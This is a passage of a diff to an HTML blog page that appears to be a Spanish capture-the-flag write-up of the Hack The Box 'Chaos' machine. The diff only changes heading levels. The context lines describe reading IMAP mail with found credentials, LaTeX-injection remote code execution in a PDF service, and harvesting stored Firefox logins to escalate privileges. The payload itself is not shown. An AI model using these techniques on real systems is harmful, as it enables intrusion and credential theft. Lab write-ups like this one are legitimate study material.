 &lt;p&gt;&lt;code&gt;[/etc/hosts]&lt;/code&gt;&lt;/p&gt;
@@ -1922,7 +1924,7 @@ password – jiujitsu
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_140435.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Al intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_140604.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;imap---puerto-993-&#34;&gt;IMAP - Puerto 993&lt;/h2&gt;
+&lt;h1 id=&#34;imap---puerto-993-&#34;&gt;IMAP - Puerto 993&lt;/h1&gt;
 &lt;p&gt;Utilizamos openssl para poder conectarnos con el &lt;code&gt;puerto 993&lt;/code&gt; y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.&lt;/p&gt;
 &lt;p&gt;En la carpeta o seccion de &lt;code&gt;Drafts&lt;/code&gt; encontramos un correo existente aun.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_141221.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -2104,7 +2106,7 @@ UID FETCH &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;chaos&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;htb&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;rce---pdftext-latex-&#34;&gt;RCE - pdfTEXT [LaTex]&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;rce---pdftext-latex-&#34;&gt;RCE - pdfTEXT [LaTex]&lt;/h1&gt;
 &lt;p&gt;Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de &lt;code&gt;pdfTEXT&lt;/code&gt;. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en &lt;code&gt;LaTex&lt;/code&gt;, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.&lt;/p&gt;
 &lt;p&gt;INFO =&amp;gt; &lt;a href=&#34;https://0day.work/hacking-with-latex/&#34;&gt;https://0day.work/hacking-with-latex/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template &lt;code&gt;test3&lt;/code&gt;:&lt;/p&gt;
@@ -2180,7 +2182,7 @@ UID FETCH &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_152137_user.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hicimos una pequeña enumeracion en los directorios de ayus y encontramos una carpeta de &lt;code&gt;.mozilla&lt;/code&gt; que pertenece a el navegador &lt;code&gt;firefox&lt;/code&gt;, revisamos los archivos que contiene esta carpeta y encontramos el archivo &lt;code&gt;login.json&lt;/code&gt; que almacena las contraseñas de firefox.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_152619.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
